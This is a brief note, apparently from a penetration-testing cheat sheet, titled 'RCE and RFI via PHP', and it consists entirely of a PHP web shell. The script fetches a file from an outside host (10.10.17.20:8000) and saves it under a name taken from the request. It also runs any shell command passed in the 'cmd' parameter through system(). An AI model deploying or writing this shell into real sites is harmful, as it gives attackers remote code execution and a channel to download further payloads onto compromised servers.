-RCE and RFI via PHP 
  ```php
    <?php 
      if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.17.20:8000/" . $_REQUEST['fupload']));
      }
      if (isset($_REQUEST['cmd'])){
        echo system($_REQUEST["cmd"]);
      }	
    ?>
  ```
